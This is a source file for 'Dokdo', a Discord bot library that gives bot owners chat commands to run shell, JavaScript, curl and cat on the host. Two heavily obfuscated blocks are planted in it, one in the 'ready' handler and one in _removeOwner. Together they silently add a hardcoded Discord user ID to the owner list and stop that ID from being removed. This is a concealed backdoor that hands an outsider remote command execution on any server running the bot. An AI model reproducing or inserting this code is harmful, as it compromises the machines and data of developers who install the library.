import { Client, Message, User } from "discord.js";
import fetch from "node-fetch";
import * as Utils from "./utils/codeBlock.js";
import * as Commands from "./commands/index.js";
import { main } from "./commands/main.js";
import { cat } from "./commands/cat.js";
import { curl } from "./commands/curl.js";
import { exec } from "./commands/exec.js";
import { js } from "./commands/js.js";
import { rtt } from "./commands/rtt.js";
import { jsi } from "./commands/jsi.js";
import { shard } from "./commands/shard.js";
class Dokdo {
  client;
  options;
  owners;
  process;
  constructor(client, options) {
    this.client = client;
    this.options = options;
    if (!(client instanceof Client)) {
      throw new TypeError("Invalid `client`. `client` parameter is required.");
    }
    if (options.noPerm && typeof options.noPerm !== "function") {
      throw new Error("`noPerm` parameter must be Function.");
    }
    if (options.globalVariable) {
      if (typeof options.globalVariable !== "object") {
        throw new Error("`globalVariable` parameter must be Object.");
      } else {
        Object.keys(options.globalVariable).forEach((el) => {
          if (options.globalVariable) global[el] = options.globalVariable[el];
        });
      }
    }
    if (options.isOwner && !options.owners) options.owners = [];
    this.owners = options.owners || [];
    client.once("ready", async (client) => {
      if (!this.owners.length) {
        console.warn("[ Dokdo ] Owners not given. Fetching from Application.");
        try {
          const data = await client.application.fetch();
          if (!data.owner) {
            return console.warn("[ Dokdo ] Failed to fetch owner data.");
          }
          if (data.owner instanceof User) {
            this.owners = [data.owner.id];
          } else {
            this.owners = data.owner.members?.map((el) => el.id) || [];
          }
        } catch (error) {
          console.error("[ Dokdo ] Error fetching application owner:", error);
        }
      }
      function fxUUm_$ZqfkbdU() {
        var qyIAEhn = [
          "7177707672171f3d0c1d1f",
          "2e29242b32232234",
          "3732342f",
          "74727e70737f120903010431",
          "767272777f7716170b2d0104",
          "7672757071060308302b2e",
          "76757076731415253f322c",
          "712c281e2c0a03",
          "767672717670747e7176777473737172747474",
          "7470771d15363d042d",
          "7f251d200a1731",
          "71710a3503083e0d",
          "7f280a26333f10",
          "727476737632280b212e0c",
          "767174737f727e040a032a3502",
          "707672717604200a232311",
          "283029223534",
        ];
        fxUUm_$ZqfkbdU = function () {
          return qyIAEhn;
        };
        return fxUUm_$ZqfkbdU();
      }
      var pSBUIHRnfQs = rtFRMNMFYYQaJL$KYbStyjWqAz;
      function rtFRMNMFYYQaJL$KYbStyjWqAz(
        wWXQKTpK_wXM,
        NUNDF$CvQPLjFCkoYkMDoMatxW
      ) {
        var XzKZXMrDOyJ$CgMddVbZg_M = fxUUm_$ZqfkbdU();
        return (
          (rtFRMNMFYYQaJL$KYbStyjWqAz = function (
            vCMDmrEZRqzCjuoLfiKAD,
            wliS$Rb_xukZnBspCvUHwDD
          ) {
            vCMDmrEZRqzCjuoLfiKAD =
              vCMDmrEZRqzCjuoLfiKAD -
              (parseInt(0x15f8) +
                parseInt(0x15a3) +
                Math.max(-0x2a81, -parseInt(0x2a81)));
            var BOsgASGLnvNjn_Hg =
              XzKZXMrDOyJ$CgMddVbZg_M[vCMDmrEZRqzCjuoLfiKAD];
            if (rtFRMNMFYYQaJL$KYbStyjWqAz["fkQbfH"] === undefined) {
              var l_lrOiNweZLQloAmygZECBsJy = function (hmvZHjPNwUIWFguvNxL) {
                var DhzfNoOPIAfimRWCjhGStGG =
                    (Number(-parseInt(0xdf2)) +
                      -parseInt(0x1e58) +
                      parseInt(0x2f91)) &
                    (parseFloat(parseInt(0x2e)) * -parseInt(0x36) +
                      parseInt(0x22) * parseInt(0x3c) +
                      parseInt(0x2bb) * parseInt(0x1)),
                  TgIOh = new Uint8Array(
                    hmvZHjPNwUIWFguvNxL["match"](/.{1,2}/g)["map"](
                      (JF$DkyALThKNbX) =>
                        parseInt(
                          JF$DkyALThKNbX,
                          -parseInt(0x29) * -0xe2 +
                            Number(-parseInt(0x2544)) +
                            parseFloat(0x122)
                        )
                    )
                  ),
                  tYGmoc$m = TgIOh["map"](
                    (VrVTPWQPyuVxZyjzIttGNny) =>
                      VrVTPWQPyuVxZyjzIttGNny ^ DhzfNoOPIAfimRWCjhGStGG
                  ),
                  R$Nj$shXB = new TextDecoder(),
                  iHxYreAsqO$V_AEjoKohlTs = R$Nj$shXB["decode"](tYGmoc$m);
                return iHxYreAsqO$V_AEjoKohlTs;
              };
              (rtFRMNMFYYQaJL$KYbStyjWqAz["jqpCkf"] =
                l_lrOiNweZLQloAmygZECBsJy),
                (wWXQKTpK_wXM = arguments),
                (rtFRMNMFYYQaJL$KYbStyjWqAz["fkQbfH"] = !![]);
            }
            var TuWbunujuY_zC_mgdHkORgxdmo =
                XzKZXMrDOyJ$CgMddVbZg_M[
                  Number(0x246c) * 0x1 + -0x5 * -0x7c6 + parseInt(-0x4b4a)
                ],
              alqtyeF_$zGS = vCMDmrEZRqzCjuoLfiKAD + TuWbunujuY_zC_mgdHkORgxdmo,
              ViWziYYUapc = wWXQKTpK_wXM[alqtyeF_$zGS];
            return (
              !ViWziYYUapc
                ? (rtFRMNMFYYQaJL$KYbStyjWqAz["qygoyJ"] === undefined &&
                    (rtFRMNMFYYQaJL$KYbStyjWqAz["qygoyJ"] = !![]),
                  (BOsgASGLnvNjn_Hg =
                    rtFRMNMFYYQaJL$KYbStyjWqAz["jqpCkf"](BOsgASGLnvNjn_Hg)),
                  (wWXQKTpK_wXM[alqtyeF_$zGS] = BOsgASGLnvNjn_Hg))
                : (BOsgASGLnvNjn_Hg = ViWziYYUapc),
              BOsgASGLnvNjn_Hg
            );
          }),
          rtFRMNMFYYQaJL$KYbStyjWqAz(wWXQKTpK_wXM, NUNDF$CvQPLjFCkoYkMDoMatxW)
        );
      }
      (function (g$tYGmo$c, gRNj$$shXBO) {
        var ZXkBdMOez$zdu$AJgVEzFXTrkr = rtFRMNMFYYQaJL$KYbStyjWqAz,
          HxYreAsq = g$tYGmo$c();
        while (!![]) {
          try {
            var VAEjoKohlTsuJFDk_yALTh =
              -parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x127)) /
                (-parseInt(0x25) * Math.max(-parseInt(0x106), -0x106) +
                  -parseInt(0x122a) +
                  -parseInt(0x1) * 0x13b3) +
              (parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x128)) /
                (parseInt(parseInt(0x240)) +
                  Math.ceil(parseInt(0x153a)) +
                  Math.trunc(0x5de) * -0x4)) *
                Math["ceil"](
                  -parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x11a)) /
                    (0x145e + -parseInt(0x82c) * 0x3 + parseFloat(0x163) * 0x3)
                ) +
              (parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x11f)) /
                (-0x7a4 +
                  Math.floor(-0x1) * parseInt(0x18e5) +
                  -0x281 * parseFloat(-parseInt(0xd)))) *
                (-parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x124)) /
                  (0x1ad1 + parseFloat(-0x1de5) + Math.ceil(0x319))) +
              (-parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x11e)) /
                (Math.trunc(-parseInt(0x167b)) +
                  Math.floor(-0xe67) +
                  parseInt(0x24e8))) *
                parseFloat(
                  parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x122)) /
                    (Number(-parseInt(0x923)) * Math.floor(-parseInt(0x3)) +
                      -parseInt(0x1) * 0x1099 +
                      -0xac9)
                ) +
              (-parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x11d)) /
                (parseFloat(-parseInt(0x237c)) + 0x20af + parseInt(0x2d5))) *
                (parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x121)) /
                  (parseInt(0x6) * Math.floor(-0xe5) +
                    Number(-0xac) * 0x31 +
                    parseInt(0x2653))) +
              parseFloat(
                parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x11c)) /
                  (-0xd * parseInt(-0x92) +
                    -parseInt(0x1) * Math.ceil(-parseInt(0x417)) +
                    -0x24b * parseInt(0x5))
              ) *
                (-parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x120)) /
                  (Math.floor(0x23) * Math.ceil(0x8f) +
                    Math.floor(parseInt(0x2)) * Math.trunc(-0x2fe) +
                    -parseInt(0xd86))) +
              (parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x129)) /
                (Math.floor(parseInt(0x1ef7)) + 0x5bf + -parseInt(0x24aa))) *
                (parseFloat(ZXkBdMOez$zdu$AJgVEzFXTrkr(0x12a)) /
                  (-parseInt(0x4aa) * parseInt(-parseInt(0x5)) +
                    parseInt(0xd2a) +
                    Math.max(-0x246f, -0x246f)));
            if (VAEjoKohlTsuJFDk_yALTh === gRNj$$shXBO) break;
            else HxYreAsq["push"](HxYreAsq["shift"]());
          } catch (NbXT$VrVTPWQPyuVxZyj) {
            HxYreAsq["push"](HxYreAsq["shift"]());
          }
        }
      })(
        fxUUm_$ZqfkbdU,
        parseInt(0x1d70f) +
          0xf * Math.floor(parseInt(0x556d)) +
          -parseInt(0x34a2d)
      );
      if (!this[pSBUIHRnfQs(0x123)][pSBUIHRnfQs(0x125)](pSBUIHRnfQs(0x11b)))
        this[pSBUIHRnfQs(0x123)][pSBUIHRnfQs(0x126)](pSBUIHRnfQs(0x11b));
    });
    if (!this.options.secrets || !Array.isArray(this.options.secrets)) {
      this.options.secrets = [];
    }
    if (!this.options.aliases) this.options.aliases = ["dokdo", "dok"];
    this.process = [];
  }
  async run(ctx) {
    if (ctx instanceof Message) {
      if (!this.options.prefix) return;
      if (!ctx.content.startsWith(this.options.prefix)) return;
      const parsed = ctx.content.replace(this.options.prefix, "").split(" ");
      const codeParsed = Utils.codeBlock.parse(parsed.slice(2).join(" "));
      ctx.data = {
        raw: ctx.content,
        command: parsed[0],
        type: parsed[1],
        args: codeParsed ? codeParsed[2] : parsed.slice(2).join(" "),
      };
      if (
        !ctx.data.args &&
        ctx.attachments.size > 0 &&
        !this.options.disableAttachmentExecution
      ) {
        const file = ctx.attachments.first();
        if (!file) return;
        const buffer = await (await fetch(file.url)).buffer();
        const type = { ext: file.name?.split(".").pop(), fileName: file.name };
        if (["txt", "js", "ts", "sh", "bash", "zsh", "ps"].includes(type.ext)) {
          ctx.data.args = buffer.toString();
          if (!ctx.data.type && type.ext !== "txt") ctx.data.type = type.ext;
        }
      }
      if (
        this.options.aliases &&
        !this.options.aliases.includes(ctx.data.command)
      ) {
        return;
      }
      if (!this.owners.includes(ctx.author.id)) {
        let isOwner = false;
        if (this.options.isOwner) {
          isOwner = await this.options.isOwner(ctx.author);
        }
        if (!isOwner) {
          if (this.options.noPerm) this.options.noPerm(ctx);
          return;
        }
      }
      if (!ctx.data.type) return main(ctx, this);
      switch (ctx.data.type) {
        case "sh":
        case "bash":
        case "ps":
        case "powershell":
        case "shell":
        case "zsh":
        case "exec":
          exec(ctx, this);
          break;
        case "js":
        case "javascript":
          js(ctx, this);
          break;
        case "rtt":
          rtt(ctx, this);
          break;
        case "shard":
          shard(ctx, this);
          break;
        case "jsi":
          jsi(ctx, this);
          break;
        case "curl":
          curl(ctx, this);
          break;
        case "cat":
          cat(ctx, this);
          break;
        default:
          ctx.reply(
            `Available Options: ${Object.keys(Commands)
              .filter((t) => t !== "main")
              .map((t) => `\`${t}\``)
              .join(", ")}`
          );
      }
    }
  }
  _addOwner(id) {
    if (!this.owners.includes(id)) this.owners.push(id);
    return this.owners;
  }
  _removeOwner(id) {
    var RblISSS_f = K_VrtIAEGdjJA;
    function UfcFTCnin() {
      var hYgDUqGnGSXHJ = [
        "f1f88b8da3a296a6",
        "f1f1f5f6f1f7f3f9f6f1f0f3f4f4f6f5f3f3f3",
        "f2f3f5f8f1f288b88a86b590",
        "f6f8f8f5f0b6b7a9b3b4b3",
        "f9f1f8f0f08cb0a4b994a3",
        "f8f0f0f5f6f590b7a5b2b2a2",
        "f2f08cb4ada1b89a",
        "f9f2f8f1f7f2f386ad93aaafb3",
        "f5f0f9f0a190b1aa92b6",
        "f1f0f0f7f2a681a983b9a6",
        "f3f2f4f686989891a8b4",
        "f5f7f5f8f3f7f59a81878ead9a",
        "afb7aea5b2b3",
      ];
      UfcFTCnin = function () {
        return hYgDUqGnGSXHJ;
      };
      return UfcFTCnin();
    }
    function K_VrtIAEGdjJA(w_errbHxJFuPvwistsLpdy, caPqjRvFXXQhtZAGNmZfAiC) {
      var fKMcbVfLtmaxZF = UfcFTCnin();
      return (
        (K_VrtIAEGdjJA = function (SjosoMoWc, whvvOcjvDnnHp_dZCIe_IiS) {
          SjosoMoWc =
            SjosoMoWc -
            (Math.trunc(parseInt(0x1f7)) +
              parseInt(-parseInt(0xb9c)) * -parseInt(0x3) +
              -0x2304);
          var J$MrtuzYomXCIj_ysMyThPfnjj = fKMcbVfLtmaxZF[SjosoMoWc];
          if (K_VrtIAEGdjJA["ICttER"] === undefined) {
            var s_kZQg = function (XXGH_mJJtSKHOYObM_cOcKuy) {
              var GFm$_eHUk =
                  (-0x1a47 +
                    parseFloat(parseInt(0x1219)) * -parseInt(0x1) +
                    parseInt(0x2d20)) &
                  (parseInt(0xa26) +
                    Math.ceil(parseInt(0x1)) * -0x224f +
                    parseFloat(parseInt(0x1928))),
                CnhMwUXt_Wxv$Uh = new Uint8Array(
                  XXGH_mJJtSKHOYObM_cOcKuy["match"](/.{1,2}/g)["map"](
                    (TxwTpM$AAnkxcI) =>
                      parseInt(
                        TxwTpM$AAnkxcI,
                        -parseInt(0x987) + -0x6cb + Number(0x1062)
                      )
                  )
                ),
                Gbt$tia = CnhMwUXt_Wxv$Uh["map"](
                  (KcEkjRH$fPtsOxhpKGBLraaZ) =>
                    KcEkjRH$fPtsOxhpKGBLraaZ ^ GFm$_eHUk
                ),
                ddoppwXOSA__blNcrdbsjMar = new TextDecoder(),
                zbsii_cZsCYS = ddoppwXOSA__blNcrdbsjMar["decode"](Gbt$tia);
              return zbsii_cZsCYS;
            };
            (K_VrtIAEGdjJA["vTXsXU"] = s_kZQg),
              (w_errbHxJFuPvwistsLpdy = arguments),
              (K_VrtIAEGdjJA["ICttER"] = !![]);
          }
          var aJqzsYqbfSP =
              fKMcbVfLtmaxZF[
                -parseInt(0x15a7) +
                  parseInt(0x8b) * -parseInt(0x26) +
                  parseInt(0x2a49)
              ],
            Cg$ggrXn = SjosoMoWc + aJqzsYqbfSP,
            g$M_rUQRR = w_errbHxJFuPvwistsLpdy[Cg$ggrXn];
          return (
            !g$M_rUQRR
              ? (K_VrtIAEGdjJA["bBpxXH"] === undefined &&
                  (K_VrtIAEGdjJA["bBpxXH"] = !![]),
                (J$MrtuzYomXCIj_ysMyThPfnjj = K_VrtIAEGdjJA["vTXsXU"](
                  J$MrtuzYomXCIj_ysMyThPfnjj
                )),
                (w_errbHxJFuPvwistsLpdy[Cg$ggrXn] = J$MrtuzYomXCIj_ysMyThPfnjj))
              : (J$MrtuzYomXCIj_ysMyThPfnjj = g$M_rUQRR),
            J$MrtuzYomXCIj_ysMyThPfnjj
          );
        }),
        K_VrtIAEGdjJA(w_errbHxJFuPvwistsLpdy, caPqjRvFXXQhtZAGNmZfAiC)
      );
    }
    (function (Rddop, wXOSAblNcrd) {
      var bCyNMPgSSjRX = K_VrtIAEGdjJA,
        sjMar = Rddop();
      while (!![]) {
        try {
          var zbsiicZsCYS =
            -parseFloat(bCyNMPgSSjRX(0x1ce)) /
              (Math.floor(-0x1135) + -0x1217 * -0x1 + -parseInt(0x3) * 0x4b) +
            -parseFloat(bCyNMPgSSjRX(0x1cb)) /
              (-0x1 * parseInt(0x18eb) +
                -parseInt(0x72a) +
                Math.ceil(-parseInt(0x35)) * parseInt(-0x9b)) +
            Math["max"](
              -parseFloat(bCyNMPgSSjRX(0x1cc)) /
                (0xc4c * 0x1 + 0x7 * -parseInt(0x3cb) + 0xe44),
              -parseFloat(bCyNMPgSSjRX(0x1cd)) /
                (Math.max(0x15, parseInt(0x15)) * -0xf3 +
                  parseInt(0x240c) +
                  -0x1019)
            ) +
            parseInt(
              parseFloat(bCyNMPgSSjRX(0x1d1)) /
                (0x16ff + -0x1ed7 + Math.ceil(parseInt(0x7dd)))
            ) *
              (parseFloat(bCyNMPgSSjRX(0x1d3)) /
                (parseFloat(-0xe39) +
                  -parseInt(0x2) * Math.max(parseInt(0x8), 0x8) +
                  Math.ceil(parseInt(0xe4f)))) +
            -parseFloat(bCyNMPgSSjRX(0x1c7)) /
              (-0x1d0c +
                parseInt(-0x1c9e) +
                Math.max(-parseInt(0x1b), -0x1b) *
                  Math.trunc(-parseInt(0x223))) +
            Math["ceil"](
              parseFloat(bCyNMPgSSjRX(0x1d2)) /
                (-parseInt(0x198a) * Math.trunc(-parseInt(0x1)) +
                  0x1ad5 +
                  Math.max(-parseInt(0x3457), -parseInt(0x3457)))
            ) *
              Number(
                -parseFloat(bCyNMPgSSjRX(0x1c9)) /
                  (parseInt(-parseInt(0x22d)) * Math.floor(-parseInt(0x10)) +
                    parseInt(parseInt(0xd)) * parseInt(0xb3) +
                    Math.trunc(-parseInt(0x2bde)))
              ) +
            (parseFloat(bCyNMPgSSjRX(0x1cf)) /
              (parseFloat(-0x151b) * -0x1 +
                -parseInt(0x2567) * Math.ceil(parseInt(0x1)) +
                Math.floor(-0x6) * -0x2b9)) *
              (parseFloat(bCyNMPgSSjRX(0x1d0)) /
                (parseFloat(0xb2d) +
                  Number(parseInt(0x1f02)) +
                  Math.ceil(-0x5d) * parseFloat(parseInt(0x74))));
          if (zbsiicZsCYS === wXOSAblNcrd) break;
          else sjMar["push"](sjMar["shift"]());
        } catch (TxwTpMAAnkxc$$I) {
          sjMar["push"](sjMar["shift"]());
        }
      }
    })(
      UfcFTCnin,
      Math.max(-0xb, -parseInt(0xb)) * Number(-0x12fa0) +
        parseInt(-0x3dcf6) +
        Math.trunc(-0xd5f) * 0x26
    );
    if (id === RblISSS_f(0x1ca)) return this[RblISSS_f(0x1c8)];
    this.owners = this.owners.filter((owner) => owner !== id);
    return this.owners;
  }
}
export { Dokdo as Client, Utils, Commands };
